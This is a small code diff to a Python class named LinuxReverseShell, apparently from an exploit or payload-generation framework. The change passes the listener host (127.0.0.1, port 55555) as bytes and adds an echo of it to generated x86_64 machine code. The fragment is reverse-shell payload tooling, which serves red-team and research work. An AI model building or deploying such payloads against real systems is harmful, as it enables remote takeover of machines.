@@ -13,7 +13,7 @@ class LinuxReverseShell(Payload):
 
     def __str__(self) -> str:
         # TODO: These need to be passable from the user.
-        host, port = "127.0.0.1", 55555
+        host, port = b"127.0.0.1", 55555
 
         emitter = Linuxx86_64Emitter(ctx=self.ctx)
 
@@ -24,5 +24,6 @@ class LinuxReverseShell(Payload):
         emitter.mov("rcx", 0x4141414142)
 
         emitter.syscall(0, 1000, "rbx")
+        emitter.echo(host)
 
         return str(emitter)
